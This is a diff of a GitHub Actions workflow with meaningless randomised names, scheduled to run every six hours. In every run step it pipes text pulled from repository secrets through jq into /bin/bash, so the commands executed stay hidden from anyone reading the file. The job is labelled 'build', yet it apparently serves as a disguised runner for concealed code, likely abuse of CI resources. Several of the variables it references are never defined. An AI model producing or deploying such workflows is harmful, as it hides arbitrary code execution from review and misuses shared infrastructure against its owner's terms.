@@ -1,27 +1,21 @@
 name: shidakai6789
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '48 3/6 * * *'
 
-jobs:  # 2306
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shidakai6789
         env:
-          tyy90: ${{ secrets.tyy90 }}
+          c8: ${{ secrets.c8 }}
         run: |
-          echo $tyy90 | jq -r .fdxs2235 | /bin/bash
-          echo $gzb7705 | jq -r .e3 | /bin/bash
-          echo $tuhhj7 | jq -r .czh8 | /bin/bash
-          echo $dfqo600 | jq -r .aebm7 | /bin/bash
-          echo $gwwi3567 | jq -r .f733 | /bin/bash
-          echo $bhxxb00829 | jq -r .lvwa953 | /bin/bash
-          echo $t79 | jq -r .og779 | /bin/bash
-          echo $lu69776 | jq -r .ncmkg774 | /bin/bash
-          echo $w3 | jq -r .sraob98 | /bin/bash
+          echo $c8 | jq -r .rf7219 | /bin/bash
+          echo $l768 | jq -r .el34 | /bin/bash
+          echo $wwvcb652 | jq -r .xd1 | /bin/bash
+          echo $tq9 | jq -r .qvazz00 | /bin/bash
+          echo $svr1840 | jq -r .qdri71 | /bin/bash
 
